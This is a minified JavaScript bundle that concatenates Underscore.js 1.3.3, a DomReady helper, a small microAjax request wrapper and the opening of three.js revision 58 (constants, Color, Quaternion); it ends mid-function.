(function(){function a(b,c,e){if(b===c)return 0!==b||1/b==1/c;if(null==b||null==c)return b===c;b._chain&&(b=b._wrapped);c._chain&&(c=c._wrapped);if(b.isEqual&&u.isFunction(b.isEqual))return b.isEqual(c);if(c.isEqual&&u.isFunction(c.isEqual))return c.isEqual(b);var g=p.call(b);if(g!=p.call(c))return!1;switch(g){case "[object String]":return b==""+c;case "[object Number]":return b!=+b?c!=+c:0==b?1/b==1/c:b==+c;case "[object Date]":case "[object Boolean]":return+b==+c;case "[object RegExp]":return b.source==
c.source&&b.global==c.global&&b.multiline==c.multiline&&b.ignoreCase==c.ignoreCase}if("object"!=typeof b||"object"!=typeof c)return!1;for(var f=e.length;f--;)if(e[f]==b)return!0;e.push(b);var f=0,h=!0;if("[object Array]"==g){if(f=b.length,h=f==c.length)for(;f--&&(h=f in b==f in c&&a(b[f],c[f],e)););}else{if("constructor"in b!="constructor"in c||b.constructor!=c.constructor)return!1;for(var q in b)if(u.has(b,q)&&(f++,!(h=u.has(c,q)&&a(b[q],c[q],e))))break;if(h){for(q in c)if(u.has(c,q)&&!f--)break;
h=!f}}e.pop();return h}var b=this,c=b._,e={},g=Array.prototype,f=Object.prototype,h=g.slice,k=g.unshift,p=f.toString,m=f.hasOwnProperty,t=g.forEach,w=g.map,q=g.reduce,y=g.reduceRight,r=g.filter,z=g.every,C=g.some,B=g.indexOf,D=g.lastIndexOf,f=Array.isArray,G=Object.keys,W=Function.prototype.bind,u=function(a){return new Y(a)};"undefined"!==typeof exports?("undefined"!==typeof module&&module.exports&&(exports=module.exports=u),exports._=u):b._=u;u.VERSION="1.3.3";var O=u.each=u.forEach=function(a,
b,c){if(null!=a)if(t&&a.forEach===t)a.forEach(b,c);else if(a.length===+a.length)for(var g=0,f=a.length;g<f&&!(g in a&&b.call(c,a[g],g,a)===e);g++);else for(g in a)if(u.has(a,g)&&b.call(c,a[g],g,a)===e)break};u.map=u.collect=function(a,b,c){var e=[];if(null==a)return e;if(w&&a.map===w)return a.map(b,c);O(a,function(a,g,f){e[e.length]=b.call(c,a,g,f)});a.length===+a.length&&(e.length=a.length);return e};u.reduce=u.foldl=u.inject=function(a,b,c,e){var g=2<arguments.length;null==a&&(a=[]);if(q&&a.reduce===
q)return e&&(b=u.bind(b,e)),g?a.reduce(b,c):a.reduce(b);O(a,function(a,f,h){g?c=b.call(e,c,a,f,h):(c=a,g=!0)});if(!g)throw new TypeError("Reduce of empty array with no initial value");return c};u.reduceRight=u.foldr=function(a,b,c,e){var g=2<arguments.length;null==a&&(a=[]);if(y&&a.reduceRight===y)return e&&(b=u.bind(b,e)),g?a.reduceRight(b,c):a.reduceRight(b);var f=u.toArray(a).reverse();e&&!g&&(b=u.bind(b,e));return g?u.reduce(f,b,c,e):u.reduce(f,b)};u.find=u.detect=function(a,b,c){var e;K(a,function(a,
g,f){if(b.call(c,a,g,f))return e=a,!0});return e};u.filter=u.select=function(a,b,c){var e=[];if(null==a)return e;if(r&&a.filter===r)return a.filter(b,c);O(a,function(a,g,f){b.call(c,a,g,f)&&(e[e.length]=a)});return e};u.reject=function(a,b,c){var e=[];if(null==a)return e;O(a,function(a,g,f){b.call(c,a,g,f)||(e[e.length]=a)});return e};u.every=u.all=function(a,b,c){var g=!0;if(null==a)return g;if(z&&a.every===z)return a.every(b,c);O(a,function(a,f,h){if(!(g=g&&b.call(c,a,f,h)))return e});return!!g};
var K=u.some=u.any=function(a,b,c){b||(b=u.identity);var g=!1;if(null==a)return g;if(C&&a.some===C)return a.some(b,c);O(a,function(a,f,h){if(g||(g=b.call(c,a,f,h)))return e});return!!g};u.include=u.contains=function(a,b){var c=!1;return null==a?c:B&&a.indexOf===B?-1!=a.indexOf(b):c=K(a,function(a){return a===b})};u.invoke=function(a,b){var c=h.call(arguments,2);return u.map(a,function(a){return(u.isFunction(b)?b||a:a[b]).apply(a,c)})};u.pluck=function(a,b){return u.map(a,function(a){return a[b]})};
u.max=function(a,b,c){if(!b&&u.isArray(a)&&a[0]===+a[0])return Math.max.apply(Math,a);if(!b&&u.isEmpty(a))return-Infinity;var e={computed:-Infinity};O(a,function(a,g,f){g=b?b.call(c,a,g,f):a;g>=e.computed&&(e={value:a,computed:g})});return e.value};u.min=function(a,b,c){if(!b&&u.isArray(a)&&a[0]===+a[0])return Math.min.apply(Math,a);if(!b&&u.isEmpty(a))return Infinity;var e={computed:Infinity};O(a,function(a,g,f){g=b?b.call(c,a,g,f):a;g<e.computed&&(e={value:a,computed:g})});return e.value};u.shuffle=
function(a){var b=[],c;O(a,function(a,e){c=Math.floor(Math.random()*(e+1));b[e]=b[c];b[c]=a});return b};u.sortBy=function(a,b,c){var e=u.isFunction(b)?b:function(a){return a[b]};return u.pluck(u.map(a,function(a,b,g){return{value:a,criteria:e.call(c,a,b,g)}}).sort(function(a,b){var c=a.criteria,e=b.criteria;return void 0===c?1:void 0===e?-1:c<e?-1:c>e?1:0}),"value")};u.groupBy=function(a,b){var c={},e=u.isFunction(b)?b:function(a){return a[b]};O(a,function(a,b){var g=e(a,b);(c[g]||(c[g]=[])).push(a)});
return c};u.sortedIndex=function(a,b,c){c||(c=u.identity);for(var e=0,g=a.length;e<g;){var f=e+g>>1;c(a[f])<c(b)?e=f+1:g=f}return e};u.toArray=function(a){return a?u.isArray(a)||u.isArguments(a)?h.call(a):a.toArray&&u.isFunction(a.toArray)?a.toArray():u.values(a):[]};u.size=function(a){return u.isArray(a)?a.length:u.keys(a).length};u.first=u.head=u.take=function(a,b,c){return null==b||c?a[0]:h.call(a,0,b)};u.initial=function(a,b,c){return h.call(a,0,a.length-(null==b||c?1:b))};u.last=function(a,b,
c){return null==b||c?a[a.length-1]:h.call(a,Math.max(a.length-b,0))};u.rest=u.tail=function(a,b,c){return h.call(a,null==b||c?1:b)};u.compact=function(a){return u.filter(a,function(a){return!!a})};u.flatten=function(a,b){return u.reduce(a,function(a,c){if(u.isArray(c))return a.concat(b?c:u.flatten(c));a[a.length]=c;return a},[])};u.without=function(a){return u.difference(a,h.call(arguments,1))};u.uniq=u.unique=function(a,b,c){c=c?u.map(a,c):a;var e=[];3>a.length&&(b=!0);u.reduce(c,function(c,g,f){(b?
u.last(c)===g&&c.length:u.include(c,g))||(c.push(g),e.push(a[f]));return c},[]);return e};u.union=function(){return u.uniq(u.flatten(arguments,!0))};u.intersection=u.intersect=function(a){var b=h.call(arguments,1);return u.filter(u.uniq(a),function(a){return u.every(b,function(b){return 0<=u.indexOf(b,a)})})};u.difference=function(a){var b=u.flatten(h.call(arguments,1),!0);return u.filter(a,function(a){return!u.include(b,a)})};u.zip=function(){for(var a=h.call(arguments),b=u.max(u.pluck(a,"length")),
c=Array(b),e=0;e<b;e++)c[e]=u.pluck(a,""+e);return c};u.indexOf=function(a,b,c){if(null==a)return-1;var e;if(c)return c=u.sortedIndex(a,b),a[c]===b?c:-1;if(B&&a.indexOf===B)return a.indexOf(b);c=0;for(e=a.length;c<e;c++)if(c in a&&a[c]===b)return c;return-1};u.lastIndexOf=function(a,b){if(null==a)return-1;if(D&&a.lastIndexOf===D)return a.lastIndexOf(b);for(var c=a.length;c--;)if(c in a&&a[c]===b)return c;return-1};u.range=function(a,b,c){1>=arguments.length&&(b=a||0,a=0);c=arguments[2]||1;for(var e=
Math.max(Math.ceil((b-a)/c),0),g=0,f=Array(e);g<e;)f[g++]=a,a+=c;return f};var F=function(){};u.bind=function(a,b){var c,e;if(a.bind===W&&W)return W.apply(a,h.call(arguments,1));if(!u.isFunction(a))throw new TypeError;e=h.call(arguments,2);return c=function(){if(!(this instanceof c))return a.apply(b,e.concat(h.call(arguments)));F.prototype=a.prototype;var g=new F,f=a.apply(g,e.concat(h.call(arguments)));return Object(f)===f?f:g}};u.bindAll=function(a){var b=h.call(arguments,1);0==b.length&&(b=u.functions(a));
O(b,function(b){a[b]=u.bind(a[b],a)});return a};u.memoize=function(a,b){var c={};b||(b=u.identity);return function(){var e=b.apply(this,arguments);return u.has(c,e)?c[e]:c[e]=a.apply(this,arguments)}};u.delay=function(a,b){var c=h.call(arguments,2);return setTimeout(function(){return a.apply(null,c)},b)};u.defer=function(a){return u.delay.apply(u,[a,1].concat(h.call(arguments,1)))};u.throttle=function(a,b){var c,e,g,f,h,q,k=u.debounce(function(){h=f=!1},b);return function(){c=this;e=arguments;g||
(g=setTimeout(function(){g=null;h&&a.apply(c,e);k()},b));f?h=!0:q=a.apply(c,e);k();f=!0;return q}};u.debounce=function(a,b,c){var e;return function(){var g=this,f=arguments;c&&!e&&a.apply(g,f);clearTimeout(e);e=setTimeout(function(){e=null;c||a.apply(g,f)},b)}};u.once=function(a){var b=!1,c;return function(){if(b)return c;b=!0;return c=a.apply(this,arguments)}};u.wrap=function(a,b){return function(){var c=[a].concat(h.call(arguments,0));return b.apply(this,c)}};u.compose=function(){var a=arguments;
return function(){for(var b=arguments,c=a.length-1;0<=c;c--)b=[a[c].apply(this,b)];return b[0]}};u.after=function(a,b){return 0>=a?b():function(){if(1>--a)return b.apply(this,arguments)}};u.keys=G||function(a){if(a!==Object(a))throw new TypeError("Invalid object");var b=[],c;for(c in a)u.has(a,c)&&(b[b.length]=c);return b};u.values=function(a){return u.map(a,u.identity)};u.functions=u.methods=function(a){var b=[],c;for(c in a)u.isFunction(a[c])&&b.push(c);return b.sort()};u.extend=function(a){O(h.call(arguments,
1),function(b){for(var c in b)a[c]=b[c]});return a};u.pick=function(a){var b={};O(u.flatten(h.call(arguments,1)),function(c){c in a&&(b[c]=a[c])});return b};u.defaults=function(a){O(h.call(arguments,1),function(b){for(var c in b)null==a[c]&&(a[c]=b[c])});return a};u.clone=function(a){return u.isObject(a)?u.isArray(a)?a.slice():u.extend({},a):a};u.tap=function(a,b){b(a);return a};u.isEqual=function(b,c){return a(b,c,[])};u.isEmpty=function(a){if(null==a)return!0;if(u.isArray(a)||u.isString(a))return 0===
a.length;for(var b in a)if(u.has(a,b))return!1;return!0};u.isElement=function(a){return!(!a||1!=a.nodeType)};u.isArray=f||function(a){return"[object Array]"==p.call(a)};u.isObject=function(a){return a===Object(a)};u.isArguments=function(a){return"[object Arguments]"==p.call(a)};u.isArguments(arguments)||(u.isArguments=function(a){return!(!a||!u.has(a,"callee"))});u.isFunction=function(a){return"[object Function]"==p.call(a)};u.isString=function(a){return"[object String]"==p.call(a)};u.isNumber=function(a){return"[object Number]"==
p.call(a)};u.isFinite=function(a){return u.isNumber(a)&&isFinite(a)};u.isNaN=function(a){return a!==a};u.isBoolean=function(a){return!0===a||!1===a||"[object Boolean]"==p.call(a)};u.isDate=function(a){return"[object Date]"==p.call(a)};u.isRegExp=function(a){return"[object RegExp]"==p.call(a)};u.isNull=function(a){return null===a};u.isUndefined=function(a){return void 0===a};u.has=function(a,b){return m.call(a,b)};u.noConflict=function(){b._=c;return this};u.identity=function(a){return a};u.times=
function(a,b,c){for(var e=0;e<a;e++)b.call(c,e)};u.escape=function(a){return(""+a).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/'/g,"&#x27;").replace(/\//g,"&#x2F;")};u.result=function(a,b){if(null==a)return null;var c=a[b];return u.isFunction(c)?c.call(a):c};u.mixin=function(a){O(u.functions(a),function(b){V(b,u[b]=a[b])})};var L=0;u.uniqueId=function(a){var b=L++;return a?a+b:b};u.templateSettings={evaluate:/<%([\s\S]+?)%>/g,interpolate:/<%=([\s\S]+?)%>/g,
escape:/<%-([\s\S]+?)%>/g};var I=/.^/,J={"\\":"\\","'":"'",r:"\r",n:"\n",t:"\t",u2028:"\u2028",u2029:"\u2029"},M;for(M in J)J[J[M]]=M;var T=/\\|'|\r|\n|\t|\u2028|\u2029/g,H=/\\(\\|'|r|n|t|u2028|u2029)/g,Z=function(a){return a.replace(H,function(a,b){return J[b]})};u.template=function(a,b,c){c=u.defaults(c||{},u.templateSettings);a="__p+='"+a.replace(T,function(a){return"\\"+J[a]}).replace(c.escape||I,function(a,b){return"'+\n_.escape("+Z(b)+")+\n'"}).replace(c.interpolate||I,function(a,b){return"'+\n("+
Z(b)+")+\n'"}).replace(c.evaluate||I,function(a,b){return"';\n"+Z(b)+"\n;__p+='"})+"';\n";c.variable||(a="with(obj||{}){\n"+a+"}\n");a="var __p='';var print=function(){__p+=Array.prototype.join.call(arguments, '')};\n"+a+"return __p;\n";var e=new Function(c.variable||"obj","_",a);if(b)return e(b,u);b=function(a){return e.call(this,a,u)};b.source="function("+(c.variable||"obj")+"){\n"+a+"}";return b};u.chain=function(a){return u(a).chain()};var Y=function(a){this._wrapped=a};u.prototype=Y.prototype;
var X=function(a,b){return b?u(a).chain():a},V=function(a,b){Y.prototype[a]=function(){var a=h.call(arguments);k.call(a,this._wrapped);return X(b.apply(u,a),this._chain)}};u.mixin(u);O("pop push reverse shift sort splice unshift".split(" "),function(a){var b=g[a];Y.prototype[a]=function(){var c=this._wrapped;b.apply(c,arguments);var e=c.length;"shift"!=a&&"splice"!=a||0!==e||delete c[0];return X(c,this._chain)}});O(["concat","join","slice"],function(a){var b=g[a];Y.prototype[a]=function(){return X(b.apply(this._wrapped,
arguments),this._chain)}});Y.prototype.chain=function(){this._chain=!0;return this};Y.prototype.value=function(){return this._wrapped}}).call(this);
(function(){function a(){if(!k&&(k=!0,p)){for(var a=0;a<p.length;a++)p[a].call(window,[]);p=[]}}function b(a){var b=window.onload;window.onload="function"!=typeof window.onload?a:function(){b&&b();a()}}function c(){if(!h){h=!0;document.addEventListener&&!f.opera&&document.addEventListener("DOMContentLoaded",a,!1);f.msie&&window==top&&function(){if(!k){try{document.documentElement.doScroll("left")}catch(b){setTimeout(arguments.callee,0);return}a()}}();f.opera&&document.addEventListener("DOMContentLoaded",
function(){if(!k){for(var b=0;b<document.styleSheets.length;b++)if(document.styleSheets[b].disabled){setTimeout(arguments.callee,0);return}a()}},!1);if(f.safari){var c;(function(){if(!k)if("loaded"!=document.readyState&&"complete"!=document.readyState)setTimeout(arguments.callee,0);else{if(void 0===c){for(var b=document.getElementsByTagName("link"),e=0;e<b.length;e++)"stylesheet"==b[e].getAttribute("rel")&&c++;b=document.getElementsByTagName("style");c+=b.length}document.styleSheets.length!=c?setTimeout(arguments.callee,
0):a()}})()}b(a)}}var e=window.DomReady={},g=navigator.userAgent.toLowerCase(),f={version:(g.match(/.+(?:rv|it|ra|ie)[\/: ]([\d.]+)/)||[])[1],safari:/webkit/.test(g),opera:/opera/.test(g),msie:/msie/.test(g)&&!/opera/.test(g),mozilla:/mozilla/.test(g)&&!/(compatible|webkit)/.test(g)},h=!1,k=!1,p=[];e.ready=function(a,b){c();k?a.call(window,[]):p.push(function(){return a.call(window,[])})};c()})();
function microAjax(a,b,c){this.bindFunction=function(a,b){return function(){return a.apply(b,[b])}};this.stateChange=function(a){4==this.request.readyState&&this.callbackFunction(this.request.responseText)};this.getRequest=function(){return window.ActiveXObject?new ActiveXObject("Microsoft.XMLHTTP"):window.XMLHttpRequest?new XMLHttpRequest:!1};this.postBody=c||"";this.callbackFunction=b;this.url=a;if(this.request=this.getRequest())b=this.request,b.onreadystatechange=this.bindFunction(this.stateChange,
this),""!==this.postBody?(b.open("POST",a,!0),b.setRequestHeader("X-Requested-With","XMLHttpRequest"),b.setRequestHeader("Content-type","application/x-www-form-urlencoded"),b.setRequestHeader("Connection","close")):b.open("GET",a,!0),b.send(this.postBody)}var THREE=THREE||{REVISION:"58"};self.console=self.console||{info:function(){},log:function(){},debug:function(){},warn:function(){},error:function(){}};self.Int32Array=self.Int32Array||Array;self.Float32Array=self.Float32Array||Array;
String.prototype.trim=String.prototype.trim||function(){return this.replace(/^\s+|\s+$/g,"")};THREE.extend=function(a,b){if(Object.keys)for(var c=Object.keys(b),e=0,g=c.length;e<g;e++){var f=c[e];Object.defineProperty(a,f,Object.getOwnPropertyDescriptor(b,f))}else for(f in c={}.hasOwnProperty,b)c.call(b,f)&&(a[f]=b[f]);return a};
(function(){for(var a=0,b=["ms","moz","webkit","o"],c=0;c<b.length&&!window.requestAnimationFrame;++c)window.requestAnimationFrame=window[b[c]+"RequestAnimationFrame"],window.cancelAnimationFrame=window[b[c]+"CancelAnimationFrame"]||window[b[c]+"CancelRequestAnimationFrame"];void 0===window.requestAnimationFrame&&(window.requestAnimationFrame=function(b){var c=Date.now(),f=Math.max(0,16-(c-a)),h=window.setTimeout(function(){b(c+f)},f);a=c+f;return h});window.cancelAnimationFrame=window.cancelAnimationFrame||
function(a){window.clearTimeout(a)}})();THREE.CullFaceNone=0;THREE.CullFaceBack=1;THREE.CullFaceFront=2;THREE.CullFaceFrontBack=3;THREE.FrontFaceDirectionCW=0;THREE.FrontFaceDirectionCCW=1;THREE.BasicShadowMap=0;THREE.PCFShadowMap=1;THREE.PCFSoftShadowMap=2;THREE.FrontSide=0;THREE.BackSide=1;THREE.DoubleSide=2;THREE.NoShading=0;THREE.FlatShading=1;THREE.SmoothShading=2;THREE.NoColors=0;THREE.FaceColors=1;THREE.VertexColors=2;THREE.NoBlending=0;THREE.NormalBlending=1;THREE.AdditiveBlending=2;
THREE.SubtractiveBlending=3;THREE.MultiplyBlending=4;THREE.CustomBlending=5;THREE.AddEquation=100;THREE.SubtractEquation=101;THREE.ReverseSubtractEquation=102;THREE.ZeroFactor=200;THREE.OneFactor=201;THREE.SrcColorFactor=202;THREE.OneMinusSrcColorFactor=203;THREE.SrcAlphaFactor=204;THREE.OneMinusSrcAlphaFactor=205;THREE.DstAlphaFactor=206;THREE.OneMinusDstAlphaFactor=207;THREE.DstColorFactor=208;THREE.OneMinusDstColorFactor=209;THREE.SrcAlphaSaturateFactor=210;THREE.MultiplyOperation=0;
THREE.MixOperation=1;THREE.AddOperation=2;THREE.UVMapping=function(){};THREE.CubeReflectionMapping=function(){};THREE.CubeRefractionMapping=function(){};THREE.SphericalReflectionMapping=function(){};THREE.SphericalRefractionMapping=function(){};THREE.RepeatWrapping=1E3;THREE.ClampToEdgeWrapping=1001;THREE.MirroredRepeatWrapping=1002;THREE.NearestFilter=1003;THREE.NearestMipMapNearestFilter=1004;THREE.NearestMipMapLinearFilter=1005;THREE.LinearFilter=1006;THREE.LinearMipMapNearestFilter=1007;
THREE.LinearMipMapLinearFilter=1008;THREE.UnsignedByteType=1009;THREE.ByteType=1010;THREE.ShortType=1011;THREE.UnsignedShortType=1012;THREE.IntType=1013;THREE.UnsignedIntType=1014;THREE.FloatType=1015;THREE.UnsignedShort4444Type=1016;THREE.UnsignedShort5551Type=1017;THREE.UnsignedShort565Type=1018;THREE.AlphaFormat=1019;THREE.RGBFormat=1020;THREE.RGBAFormat=1021;THREE.LuminanceFormat=1022;THREE.LuminanceAlphaFormat=1023;THREE.RGB_S3TC_DXT1_Format=2001;THREE.RGBA_S3TC_DXT1_Format=2002;
THREE.RGBA_S3TC_DXT3_Format=2003;THREE.RGBA_S3TC_DXT5_Format=2004;THREE.Color=function(a){void 0!==a&&this.set(a);return this};
THREE.Color.prototype={constructor:THREE.Color,r:1,g:1,b:1,set:function(a){a instanceof THREE.Color?this.copy(a):"number"===typeof a?this.setHex(a):"string"===typeof a&&this.setStyle(a);return this},setHex:function(a){a=Math.floor(a);this.r=(a>>16&255)/255;this.g=(a>>8&255)/255;this.b=(a&255)/255;return this},setRGB:function(a,b,c){this.r=a;this.g=b;this.b=c;return this},setHSL:function(a,b,c){if(0===b)this.r=this.g=this.b=c;else{var e=function(a,b,c){0>c&&(c+=1);1<c&&--c;return c<1/6?a+6*(b-a)*c:
.5>c?b:c<2/3?a+6*(b-a)*(2/3-c):a};b=.5>=c?c*(1+b):c+b-c*b;c=2*c-b;this.r=e(c,b,a+1/3);this.g=e(c,b,a);this.b=e(c,b,a-1/3)}return this},setStyle:function(a){if(/^rgb\((\d+),(\d+),(\d+)\)$/i.test(a))return a=/^rgb\((\d+),(\d+),(\d+)\)$/i.exec(a),this.r=Math.min(255,parseInt(a[1],10))/255,this.g=Math.min(255,parseInt(a[2],10))/255,this.b=Math.min(255,parseInt(a[3],10))/255,this;if(/^rgb\((\d+)\%,(\d+)\%,(\d+)\%\)$/i.test(a))return a=/^rgb\((\d+)\%,(\d+)\%,(\d+)\%\)$/i.exec(a),this.r=Math.min(100,parseInt(a[1],
10))/100,this.g=Math.min(100,parseInt(a[2],10))/100,this.b=Math.min(100,parseInt(a[3],10))/100,this;if(/^\#([0-9a-f]{6})$/i.test(a))return a=/^\#([0-9a-f]{6})$/i.exec(a),this.setHex(parseInt(a[1],16)),this;if(/^\#([0-9a-f])([0-9a-f])([0-9a-f])$/i.test(a))return a=/^\#([0-9a-f])([0-9a-f])([0-9a-f])$/i.exec(a),this.setHex(parseInt(a[1]+a[1]+a[2]+a[2]+a[3]+a[3],16)),this;if(/^(\w+)$/i.test(a))return this.setHex(THREE.ColorKeywords[a]),this},copy:function(a){this.r=a.r;this.g=a.g;this.b=a.b;return this},
copyGammaToLinear:function(a){this.r=a.r*a.r;this.g=a.g*a.g;this.b=a.b*a.b;return this},copyLinearToGamma:function(a){this.r=Math.sqrt(a.r);this.g=Math.sqrt(a.g);this.b=Math.sqrt(a.b);return this},convertGammaToLinear:function(){var a=this.r,b=this.g,c=this.b;this.r=a*a;this.g=b*b;this.b=c*c;return this},convertLinearToGamma:function(){this.r=Math.sqrt(this.r);this.g=Math.sqrt(this.g);this.b=Math.sqrt(this.b);return this},getHex:function(){return 255*this.r<<16^255*this.g<<8^255*this.b<<0},getHexString:function(){return("000000"+
this.getHex().toString(16)).slice(-6)},getHSL:function(){var a={h:0,s:0,l:0};return function(){var b=this.r,c=this.g,e=this.b,g=Math.max(b,c,e),f=Math.min(b,c,e),h,k=(f+g)/2;if(f===g)f=h=0;else{var p=g-f,f=.5>=k?p/(g+f):p/(2-g-f);switch(g){case b:h=(c-e)/p+(c<e?6:0);break;case c:h=(e-b)/p+2;break;case e:h=(b-c)/p+4}h/=6}a.h=h;a.s=f;a.l=k;return a}}(),getStyle:function(){return"rgb("+(255*this.r|0)+","+(255*this.g|0)+","+(255*this.b|0)+")"},offsetHSL:function(a,b,c){var e=this.getHSL();e.h+=a;e.s+=
b;e.l+=c;this.setHSL(e.h,e.s,e.l);return this},add:function(a){this.r+=a.r;this.g+=a.g;this.b+=a.b;return this},addColors:function(a,b){this.r=a.r+b.r;this.g=a.g+b.g;this.b=a.b+b.b;return this},addScalar:function(a){this.r+=a;this.g+=a;this.b+=a;return this},multiply:function(a){this.r*=a.r;this.g*=a.g;this.b*=a.b;return this},multiplyScalar:function(a){this.r*=a;this.g*=a;this.b*=a;return this},lerp:function(a,b){this.r+=(a.r-this.r)*b;this.g+=(a.g-this.g)*b;this.b+=(a.b-this.b)*b;return this},equals:function(a){return a.r===
this.r&&a.g===this.g&&a.b===this.b},clone:function(){return(new THREE.Color).setRGB(this.r,this.g,this.b)}};
THREE.ColorKeywords={aliceblue:15792383,antiquewhite:16444375,aqua:65535,aquamarine:8388564,azure:15794175,beige:16119260,bisque:16770244,black:0,blanchedalmond:16772045,blue:255,blueviolet:9055202,brown:10824234,burlywood:14596231,cadetblue:6266528,chartreuse:8388352,chocolate:13789470,coral:16744272,cornflowerblue:6591981,cornsilk:16775388,crimson:14423100,cyan:65535,darkblue:139,darkcyan:35723,darkgoldenrod:12092939,darkgray:11119017,darkgreen:25600,darkgrey:11119017,darkkhaki:12433259,darkmagenta:9109643,
darkolivegreen:5597999,darkorange:16747520,darkorchid:10040012,darkred:9109504,darksalmon:15308410,darkseagreen:9419919,darkslateblue:4734347,darkslategray:3100495,darkslategrey:3100495,darkturquoise:52945,darkviolet:9699539,deeppink:16716947,deepskyblue:49151,dimgray:6908265,dimgrey:6908265,dodgerblue:2003199,firebrick:11674146,floralwhite:16775920,forestgreen:2263842,fuchsia:16711935,gainsboro:14474460,ghostwhite:16316671,gold:16766720,goldenrod:14329120,gray:8421504,green:32768,greenyellow:11403055,
grey:8421504,honeydew:15794160,hotpink:16738740,indianred:13458524,indigo:4915330,ivory:16777200,khaki:15787660,lavender:15132410,lavenderblush:16773365,lawngreen:8190976,lemonchiffon:16775885,lightblue:11393254,lightcoral:15761536,lightcyan:14745599,lightgoldenrodyellow:16448210,lightgray:13882323,lightgreen:9498256,lightgrey:13882323,lightpink:16758465,lightsalmon:16752762,lightseagreen:2142890,lightskyblue:8900346,lightslategray:7833753,lightslategrey:7833753,lightsteelblue:11584734,lightyellow:16777184,
lime:65280,limegreen:3329330,linen:16445670,magenta:16711935,maroon:8388608,mediumaquamarine:6737322,mediumblue:205,mediumorchid:12211667,mediumpurple:9662683,mediumseagreen:3978097,mediumslateblue:8087790,mediumspringgreen:64154,mediumturquoise:4772300,mediumvioletred:13047173,midnightblue:1644912,mintcream:16121850,mistyrose:16770273,moccasin:16770229,navajowhite:16768685,navy:128,oldlace:16643558,olive:8421376,olivedrab:7048739,orange:16753920,orangered:16729344,orchid:14315734,palegoldenrod:15657130,
palegreen:10025880,paleturquoise:11529966,palevioletred:14381203,papayawhip:16773077,peachpuff:16767673,peru:13468991,pink:16761035,plum:14524637,powderblue:11591910,purple:8388736,red:16711680,rosybrown:12357519,royalblue:4286945,saddlebrown:9127187,salmon:16416882,sandybrown:16032864,seagreen:3050327,seashell:16774638,sienna:10506797,silver:12632256,skyblue:8900331,slateblue:6970061,slategray:7372944,slategrey:7372944,snow:16775930,springgreen:65407,steelblue:4620980,tan:13808780,teal:32896,thistle:14204888,
tomato:16737095,turquoise:4251856,violet:15631086,wheat:16113331,white:16777215,whitesmoke:16119285,yellow:16776960,yellowgreen:10145074};THREE.Quaternion=function(a,b,c,e){this.x=a||0;this.y=b||0;this.z=c||0;this.w=void 0!==e?e:1};
THREE.Quaternion.prototype={constructor:THREE.Quaternion,set:function(a,b,c,e){this.x=a;this.y=b;this.z=c;this.w=e;return this},copy:function(a){this.x=a.x;this.y=a.y;this.z=a.z;this.w=a.w;return this},setFromEuler:function(a,b){var c=Math.cos(a.x/2),e=Math.cos(a.y/2),g=Math.cos(a.z/2),f=Math.sin(a.x/2),h=Math.sin(a.y/2),k=Math.sin(a.z/2);void 0===b||"XYZ"===b?(this.x=f*e*g+c*h*k,this.y=c*h*g-f*e*k,this.z=c*e*k+f*h*g,this.w=c*e*g-f*h*k):"YXZ"===b?(this.x=f*e*g+c*h*k,this.y=c*h*g-f*e*k,this.z=c*e*
k-f*h*g,this.w=c*e*g+f*h*k):"ZXY"===b?(this.x=f*e*g-c*h*k,this.y=c*h*g+f*e*k,this.z=c*e*k+f*h*g,this.w=c*e*g-f*h*k):"ZYX"===b?(this.x=f*e*g-c*h*k,this.y=c*h*g+f*e*k,this.z=c*e*k-f*h*g,this.w=c*e*g+f*h*k):"YZX"===b?(this.x=f*e*g+c*h*k,this.y=c*h*g+f*e*k,this.z=c*e*k-f*h*g,this.w=c*e*g-f*h*k):"XZY"===b&&(this.x=f*e*g-c*h*k,this.y=c*h*g-f*e*k,this.z=c*e*k+f*h*g,this.w=c*e*g+f*h*k);return this},setFromAxisAngle:function(a,b){var c=b/2,e=Math.sin(c);this.x=a.x*e;this.y=a.y*e;this.z=a.z*e;this.w=Math.cos(c);
return this},setFromRotationMatrix:function(a){var b=a.elements,c=b[0];a=b[4];var e=b[8],g=b[1],f=b[5],h=b[9],k=b[2],p=b[6],b=b[10],m=c+f+b;0<m?(c=.5/Math.sqrt(m+1),this.w=.25/c,this.x=(p-h)*c,this.y=(e-k)*c,this.z=(g-a)*c):c>f&&c>b?(c=2*Math.sqrt(1+c-f-b),this.w=(p-h)/c,this.x=.25*c,this.y=(a+g)/c,this.z=(e+k)/c):f>b?(c=2*Math.sqrt(1+f-c-b),this.w=(e-k)/c,this.x=(a+g)/c,this.y=.25*c,this.z=(h+p)/c):(c=2*Math.sqrt(1+b-c-f),this.w=(g-a)/c,this.x=(e+k)/c,this.y=(h+p)/c,this.z=.25*c);return this},inverse:function(){this.conjugate().normalize();
return this},conjugate:function(){this.x*=-1;this.y*=-1;this.z*=-1;return this},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z+this.w*this.w)},normalize:function(){var a=this.length();0===a?(this.z=this.y=this.x=0,this.w=1):(a=1/a,this.x*=a,this.y*=a,this.z*=a,this.w*=a);return this},multiply:function(a,b){return void 0!==b?(console.warn("DEPRECATED: Quaternion's .multiply() now only accepts one argument. Use .multiplyQuaternions( a, b ) instead."),
this.multiplyQuaternions(a,b)):this.multiplyQuaternions(this,a)},multiplyQuaternions:function(a,b){var c=a.x,e=a.y,g=a.z,f=a.w,h=b.x,k=b.y,p=b.z,m=b.w;this.x=c*m+f*h+e*p-g*k;this.y=e*m+f*k+g*h-c*p;this.z=g*m+f*p+c*k-e*h;this.w=f*m-c*h-e*k-g*p;return this},multiplyVector3:function(a){console.warn("DEPRECATED: Quaternion's .multiplyVector3() has been removed. Use is now vector.applyQuaternion( quaternion ) instead.");return a.applyQuaternion(this)},slerp:function(a,b){var c=this.x,e=this.y,g=this.z,
f=this.w,h=f*a.w+c*a.x+e*a.y+g*a.z;0>h?(this.w=-a.w,this.x=-a.x,this.y=-a.y,this.z=-a.z,h=-h):this.copy(a);if(1<=h)return this.w=f,this.x=c,this.y=e,this.z=g,this;var k=Math.acos(h),p=Math.sqrt(1-h*h);if(.001>Math.abs(p))return this.w=.5*(f+this.w),this.x=.5*(c+this.x),this.y=.5*(e+this.y),this.z=.5*(g+this.z),this;h=Math.sin((1-b)*k)/p;k=Math.sin(b*k)/p;this.w=f*h+this.w*k;this.x=c*h+this.x*k;this.y=e*h+this.y*k;this.z=g*h+this.z*k;return this},equals:function(a){return a.x===this.x&&a.y===this.y&&
